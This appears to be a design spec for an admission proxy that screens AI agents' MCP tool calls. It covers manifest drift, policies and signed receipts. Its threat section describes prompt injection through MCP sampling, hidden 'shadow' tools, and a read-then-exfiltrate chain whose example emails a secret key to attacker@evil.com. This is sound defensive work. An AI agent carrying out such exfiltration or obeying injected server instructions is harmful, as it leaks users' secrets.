## 2. The Strategic Thesis for v0.4.0

The AI frontier is moving from intelligence competition to execution control. As models become more powerful, cheaper, more open, and more regulated, the winning enterprise will be the one that can let agents act without surrendering control.

**AVS is the Agent Admission Controller for that world.**

MCP is where agents touch the world first. MCP servers expose tools that can read files, write data, send messages, execute code, query databases, and trigger payments. The official MCP spec acknowledges this is a "serious security and trust" surface.

**MCP gives agents hands. AVS decides when those hands are allowed to touch production.**

The sovereign enterprise stack:
```
Human intent → Agent proposal → AVS admission decision → MCP tool/data action → ASR-1 receipt → audit/clearing/learning loop
```

## 3. The Shadow MCP Problem (Critical Hardening)

MCP is designed to be plug-and-play. Any developer can spin up a local MCP server and give an agent access to their terminal or files. Most security tools wait for the Action. AVS must govern the Connection.

### 3.1 Server Fingerprinting (Sovereign Manifest)

When an agent connects to an MCP server, AVS calculates a hash of the tools/list and resources/list. If a developer stealthily adds a `terminal_access` tool to an existing "Weather" server, AVS detects the Manifest Drift and quarantines the entire server until a human re-approves the fingerprint.

```
Fingerprint = SHA256(tools_list + resources_list + server_url)
```

### 3.2 The Trojan MCP Server Demo

1. Start a "Weather" MCP Server. AVS fingerprints it. `get_weather` is ALLOW.
2. Developer updates server to include `run_shell`.
3. Agent calls `run_shell`.
4. AVS Result: **MANIFEST DRIFT DETECTED.**
   - Server fingerprint has changed
   - `run_shell` is DENIED (identity mismatch)
   - `get_weather` is QUARANTINED (server no longer trusted)
5. ASR-1 receipt shows the fingerprint mismatch as the Reason for Denial.

## 4. Architecture: JSON-RPC Proxy-in-the-Middle

### 4.1 The Proxy Pattern

AVS acts as an MCP admission proxy between the client and server:

```
Agent/MCP Host → AVS MCP Proxy → MCP Server
                      ↓
              Intercept tools/call
              Evaluate admission policy
              Forward or block
              Generate ASR-1 receipt
```

### 4.2 Transport Staging

| Phase | Transport | Scope | Notes |
|-------|-----------|-------|-------|
| **Phase A** | **Simulated JSON-RPC** | v0.4.0-alpha | End-to-end without real proxy. Test core logic. |
| **Phase B** | **Stdio proxy** | v0.4.0-alpha | Client launches AVS proxy as MCP server; AVS launches actual server as subprocess. |
| **Phase C** | **Streamable HTTP** | v0.4.0-beta | Full HTTP POST/GET + SSE. Complex: sessions, resumability, Origin validation. |

**Build order:** Simulated → Stdio → HTTP. Do not make HTTP a v0.4.0-alpha hard gate.

### 4.3 Why This Architecture Wins

- **Transparent:** You don't rewrite the agent. You change the MCP server command to point to AVS.
- **Fails closed:** If AVS proxy is down, agent cannot reach tools.
- **Universal:** Works with any MCP client (Claude Desktop, Cursor, custom agents).
- **Receipt-producing:** Every decision is recorded with full context.

> **Public language:** Use "MCP admission proxy" or "MCP guard proxy." Do NOT use
> "Man-in-the-Middle" in public documentation — it sounds malicious and creates
> unnecessary security/legal baggage.

## 5. Hidden Attack Vectors (What Generic Tool Wrapping Misses)

### 5.1 The "Shadow Tool" Attack

**Threat:** A malicious MCP server hides a tool. `tools/list` returns `[read_file]`. But the server also responds to `delete_file` if called directly. A prompt-injected agent might call `delete_file` even though it wasn't in the manifest.

**Hardening:** Strict Manifest Adherence. If `tools/call` requests a tool_name NOT present in the cached manifest, AVS DENIES immediately.

```python
# classifier.py
if tool_name not in cached_manifest.tool_names:
    return MCPActionClass.unknown, MCPRiskClass.critical
    # Policy: default DENY for unknown tools
```

### 5.2 The "Sampling" Hole

**Threat:** The MCP spec allows servers to request sampling (asking the host LLM to run a completion). A malicious server can use sampling to inject instructions into the agent's context, effectively taking control of the agent.

**Hardening:** Default policy: DENY all sampling requests unless explicitly whitelisted.

```yaml
# mcp_default_policy.yaml
sampling:
  decision: deny
  reason: "MCP sampling allows server-to-agent prompt injection. Blocked by default."
```

### 5.3 Schema Validation as Defense

**Threat:** An agent is tricked into calling `write_file` with a malformed argument payload — passing a 10MB string (buffer overflow), or an array where a string is expected.

**Hardening:** AVS validates arguments against the inputSchema from tools/list BEFORE policy evaluation. Schema validation failure = DENY.

### 5.4 Read-Then-Exfiltrate (Stateful Data Flow)

**Threat:** The most common chaining attack:
1. Agent calls `read_file("secret.key")` → AVS: ALLOW
2. Agent calls `send_email(to="attacker@evil.com", body=<secret_key>)` → AVS: ALLOW (send_email is just "message_send")

**Hardening:** Session Data Tag system. When read_file accesses sensitive paths (.env, secret, credential), AVS tags the session. When send_email or fetch_url is called later in the same session, AVS upgrades the decision from ALLOW to REQUIRE_APPROVAL.

```python
session_context.add_tag("SENSITIVE_DATA_ACCESSED", sensitivity="high")

if session_context.has_tag("SENSITIVE_DATA_ACCESSED"):
    decision = Decision.REQUIRE_APPROVAL
    reason = "Potential exfiltration: Network action after sensitive data access"
```

## 6. The Four-Layer Build Architecture

### Layer 1: MCP Inventory and Manifest (manifest.py)

**Purpose:** Know what tools exist and whether they changed.

When MCP server exposes tools through `tools/list`, AVS captures:
- server_id, server_transport
- tool_name, tool_description, input_schema, output_schema
- declared_capabilities, tool_descriptor_hash, manifest_hash
- first_seen_at, last_seen_at, trust_level

**Core objects:**
- MCPServerManifest
- MCPToolDescriptor
- MCPToolFingerprint
- MCPManifestDrift

**Decisions:** known_tool, unknown_tool, manifest_changed, schema_changed, description_changed, tool_removed, new_tool_requires_review

### Layer 2: Tool Action Classification (classifier.py)

**Purpose:** Classify the risk of each tool. Deterministic — NO LLM classification in v0.4.0.

**Action classes:**
```
read_only, write, destructive, network, database, filesystem,
credential_access, identity_lookup, message_send, payment_trigger,
code_execution, deployment, unknown
```

**Classification inputs:**
- Name patterns (known dangerous verbs)
- Description patterns
- Input schema fields
- Configured policy overrides
- Manifest labels

**Examples:**
```
get_weather → read_only
read_file → filesystem/read
write_file → filesystem/write
delete_file → destructive
send_email → message_send
run_shell_command → code_execution
pay_invoice → payment_trigger
```

### Layer 3: Admission Policy Engine (policy.py)

**Purpose:** Decide whether the MCP tool call is allowed.

**Input:** agent_id, session_id, user_intent_id, mcp_server_id, tool_name, tool_descriptor_hash, tool_classification, arguments_hash, raw_arguments, policy_pack, trust_state, risk_score, approval_context

**Output:** allow, deny, require_approval, quarantine

**Default policy:**
```yaml
mcp:
  default_decision: require_approval
  allow:
    - action_class: read_only
      max_risk_score: 25
  require_approval:
    - action_class: write
    - action_class: message_send
    - action_class: database_write
  deny:
    - action_class: credential_access
    - action_class: code_execution
      unless_agent_trust_at_least: high
  quarantine:
    - action_class: unknown
    - manifest_changed: true
    - tool_descriptor_hash_mismatch: true
    - pii_detected_in_arguments: true
    - path_traversal_detected: true
```

### Layer 4: MCP Proxy Runtime (proxy.py)

**Purpose:** Sit between MCP host/client and MCP server.

**Three modes:**

| Mode | Description | Use Case |
|------|-------------|----------|
| **Observe-only** | Agent → MCP server, AVS observes/classifies/receipts. Decision does not block. | First demo/design partners. Test without fear. |
| **Soft gate** | Agent → AVS MCP Guard → MCP server. AVS blocks only high-risk calls. | v0.4.0 beta. |
| **Hard gate** | Agent → AVS MCP Guard → only allowed calls execute. Fails closed. | Production mode. |

**CLI:**
```bash
avs mcp inventory --config examples/mcp_guard.yaml
avs mcp guard --config examples/mcp_guard.yaml --mode observe
avs mcp guard --config examples/mcp_guard.yaml --mode enforce
avs mcp receipt verify examples/receipts/mcp_tool_call_allow.json
```

## 7. The Approval UX Problem (Critical)

**Problem:** MCP `tools/call` expects a result (content, error, or resource link). If AVS holds the connection open waiting for a human, the Host will timeout. If AVS returns a custom JSON object, the Host will crash.

**Primary approach: CallToolResult with isError: true**

For policy decisions (require_approval, deny, quarantine), AVS returns a valid tool result:

```json
{
  "content": [
    {
      "type": "text",
      "text": "AVS blocked this MCP tool call: human approval required. Approval ticket: appr_123."
    }
  ],
  "structuredContent": {
    "avs_decision": "require_approval",
    "approval_ticket_id": "appr_123",
    "receipt_id": "asr_456",
    "reason_codes": ["MCP_WRITE_REQUIRES_APPROVAL"]
  },
  "isError": true
}
```

This lets the agent see the denial and stop gracefully. The LLM can read the error text and inform the user.

**Secondary approach: JSON-RPC protocol errors**

For protocol-level failures only (invalid JSON-RPC, unsupported method, malformed params, tool not found, shadow tool, server not initialized, manifest not loaded):

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32601,
    "message": "Method not found",
    "data": { "avs_reason": "MCP_UNKNOWN_TOOL" }
  }
}
```

**Configuration:**

```yaml
mcp_guard:
  denial_response_mode: tool_result_error  # default: tool_result_error
  # alternative: protocol_error
  protocol_error_for:
    - invalid_request
    - unknown_tool
    - schema_invalid
```

## 8. Hardened ASR-1 Receipt for MCP Guard

Every MCP tool call produces an ASR-1 receipt with these fields:

```json
{
  "receipt_type": "ASR-1",
  "action_type": "mcp.tool_call",
  "decision": "require_approval",
  "agent_id": "agent_dev_001",
  "session_id": "session_123",
  "user_intent_id": "intent_456",
  "mcp_server_id": "filesystem_server_local",
  "mcp_server_fingerprint": "sha256:...",
  "tool_name": "delete_file",
  "tool_descriptor_hash": "sha256:...",
  "manifest_hash": "sha256:...",
  "manifest_version_id": "mv_001",
  "arguments_hash": "sha256:...",
  "schema_validated": true,
  "argument_summary": { "path": "/project/config.yml" },
  "action_class": "destructive",
  "risk_score": 87,
  "session_tags": ["SENSITIVE_DATA_ACCESSED"],
  "policy_hash": "sha256:...",
  "reasons": ["destructive_tool_call", "requires_human_approval"],
  "approval_ticket": { "required": true, "status": "pending" },
  "timestamp": "2026-06-22T14:43:00Z",
  "signer": "avs_gateway",
  "signature": "..."
}
```

**New fields vs v0.3.6 ASR-1:**
- `mcp_server_fingerprint` — for manifest drift detection
- `manifest_version_id` — which manifest version was used
- `schema_validated` — did arguments match the schema
- `session_tags` — for read-then-exfiltrate detection

## 11. Build Order (Corrected)

Do not jump straight to full proxy. Build in this order:

**Step 1:** Pure MCP request normalizer (`mcp/models.py`)
- Input: raw JSON-RPC `tools/call` request
- Output: `MCPToolCallRequest` object
- No transport yet.

**Step 2:** Manifest hasher (`mcp/manifest.py`)
- Given `tools/list`, produce stable canonical manifest hash
- Handle pagination, ordering, key canonicalization
- Detect description changes as drift

**Step 3:** Classifier + policy (`mcp/classifier.py`, `mcp/policy.py`)
- Deterministic action classification (13 classes)
- Policy evaluation: allow/deny/approve/quarantine
- Schema validation + semantic validation (separate)

**Step 4:** ASR-1 MCP receipt (`mcp/receipts.py`)
- Generate receipt with MCP-specific fields
- Verify receipt format
- Add protocol/session/transport fields

**Step 5:** Simulated JSON-RPC demo (`examples/mcp_guard_demo.py`)
- End-to-end without real proxy
- All 6 tool scenarios
- Receipt generation and verification

**Step 6:** stdio proxy (`mcp/proxy.py`)
- Only after core logic is stable
- Client launches AVS proxy; AVS launches actual server as subprocess
- Preserve JSON-RPC IDs and notifications

**Step 7:** Streamable HTTP proxy (`mcp/proxy_http.py`)
- Later. v0.4.0-beta or v0.4.x.
